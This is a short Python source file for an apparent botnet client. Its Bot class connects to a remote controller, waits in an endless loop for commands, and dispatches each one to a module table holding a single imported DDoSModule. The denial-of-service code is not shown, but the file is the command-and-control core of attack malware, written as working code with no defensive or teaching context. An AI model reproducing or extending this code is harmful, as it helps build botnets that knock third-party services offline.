'''
Created on Dec 20, 2013

@author: Onur
'''

from CommandParser import CommandParser
from modules.DDoSModule import DDoSModule

class Bot(object):
    '''
    classdocs
    '''
    
    __client = None
    __modules = None

    def __init__(self, client):
        '''
        Constructor
        '''
        self.__client = client
        self.__modules = {1:DDoSModule()}
        
    def runCommand(self, cmd):
        self.__modules[int(cmd[0])].start(cmd[1:])
    
    def activate(self):
        self.__client.connect()
        while True:
            cmd = self.__client.waitForCommand()
            self.runCommand(CommandParser.parseCommand(cmd))
        